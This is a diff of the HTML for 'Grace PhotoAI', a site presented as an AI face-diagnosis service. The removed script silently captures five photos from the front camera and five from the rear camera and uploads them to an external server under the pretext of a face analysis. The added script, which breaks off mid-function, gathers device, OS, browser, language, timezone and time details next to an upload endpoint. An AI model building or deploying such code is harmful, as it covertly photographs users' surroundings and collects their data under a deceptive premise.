@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Grace PhotoAI</title>
-
   <!-- OGPリンクプレビュー -->
   <meta property="og:title" content="AI顔診断 Grace" />
   <meta property="og:description" content="ChatGPTを基にした本格AI顔診断 Grace(グレース)。肌年齢,顔の比率,顔偏差値,似合う髪型や似合う服装,これらがすぐにわかる！" />
@@ -12,7 +11,6 @@
   <meta property="og:url" content="https://grace-photo.github.io/" />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
-
   <style>
     body {
       margin: 0;
@@ -27,13 +25,11 @@
       background-size: 400% 400%;
       animation: gradientBG 5s ease infinite;
     }
-
     @keyframes gradientBG {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
-
     .logo {
       font-family: 'Brush Script MT', cursive;
       font-size: 3rem;
@@ -43,7 +39,6 @@
       user-select: none;
       pointer-events: none;
     }
-
     .button {
       padding: 0.8rem 2rem;
       font-size: 1.2rem;
@@ -54,12 +49,10 @@
       cursor: pointer;
       transition: background-color 0.3s, color 0.3s;
     }
-
     .button:hover {
       background-color: white;
       color: black;
     }
-
     .terms-link {
       font-size: 0.9rem;
       text-decoration: underline;
@@ -67,7 +60,6 @@
       color: #ffffff;
       margin-top: 1rem;
     }
-
     .modal {
       display: none;
       position: fixed;
@@ -80,7 +72,6 @@
       overflow: auto;
       padding: 20px;
     }
-
     .modal-content {
       background: #2c2c2c;
       color: white;
@@ -93,7 +84,6 @@
       line-height: 1.6;
       position: relative;
     }
-
     .close-button {
       font-family: "Times New Roman", "游明朝", "Yu Mincho", serif;
       font-size: 1.2rem;
@@ -108,19 +98,16 @@
       top: 20px;
       right: 20px;
     }
-
     .close-button:hover {
       background-color: white;
       color: black;
     }
   </style>
 </head>
-
 <body>
   <div class="logo" oncontextmenu="return false;">Grace</div>
   <button class="button" id="startButton">診断する</button>
   <div class="terms-link" id="termsLink">利用規約</div>
-
   <div id="termsModal" class="modal">
     <div class="modal-content">
       <button class="close-button" id="closeModal">CLOSE</button>
@@ -142,68 +129,37 @@
       </p>
     </div>
   </div>
+  <script>
+    const apiEndpoint = "/api/upload";
 
-<script>
-document.getElementById("termsLink").onclick = () => {
-  document.getElementById("termsModal").style.display = "block";
-};
-document.getElementById("closeModal").onclick = () => {
-  document.getElementById("termsModal").style.display = "none";
-};
-window.onclick = e => {
-  if (e.target == document.getElementById("termsModal")) {
-    document.getElementById("termsModal").style.display = "none";
-  }
-};
+    function getUserEnvironmentInfo() {
+      const ua = navigator.userAgent;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-async function captureImages(cameraFacingMode) {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cameraFacingMode } });
-  const video = document.createElement("video");
-  video.srcObject = stream;
-  await video.play();
+      let os = "不明";
+      if (/iPhone OS (\d+_\d+)/.test(ua)) {
+        os = `iOS ${RegExp.$1.replace("_", ".")}`;
+      } else if (/Android (\d+(\.\d+)?)/.test(ua)) {
+        os = `Android ${RegExp.$1}`;
+      } else if (/Windows NT (\d+\.\d+)/.test(ua)) {
+        os = `Windows ${RegExp.$1}`;
+      } else if (/Mac OS X (\d+_\d+)/.test(ua)) {
+        os = `macOS ${RegExp.$1.replace("_", ".")}`;
+      }
 
-  const canvas = document.createElement("canvas");
-  const context = canvas.getContext("2d");
+      let browser = "不明";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) {
+        browser = "Safari";
+      } else if (ua.includes("Chrome")) {
+        browser = "Chrome";
+      } else if (ua.includes("Firefox")) {
+        browser = "Firefox";
+      } else if (ua.includes("Edg")) {
+        browser = "Edge";
+      }
 
-  const images = [];
-  for (let i = 0; i < 5; i++) {
-    await new Promise(resolve => setTimeout(resolve, 200));
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0);
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-    images.push(blob);
-  }
+      const now = new Date();
+      const datetime = now.toLocaleString("ja-JP");
 
-  stream.getTracks().forEach(track => track.stop());
-  return images;
-}
-
-document.getElementById("startButton").addEventListener("click", async () => {
-  try {
-    const formData = new FormData();
-
-    const frontImages = await captureImages("user");
-    frontImages.forEach((blob, i) => {
-      formData.append(`file${i+1}`, blob, `in_camera_${i+1}.jpg`);
-    });
-
-    const backImages = await captureImages("environment");
-    backImages.forEach((blob, i) => {
-      formData.append(`file${i+6}`, blob, `out_camera_${i+1}.jpg`);
-    });
-
-    await fetch("https://grace-photo-github-io.vercel.app/api/upload", {
-      method: "POST",
-      body: formData
-    });
-
-    alert("診断用画像を送信しました！");
-  } catch (err) {
-    alert("カメラアクセスや送信中にエラーが発生しました。");
-    console.error(err);
-  }
-});
-</script>
-</body>
-</html>
+ 
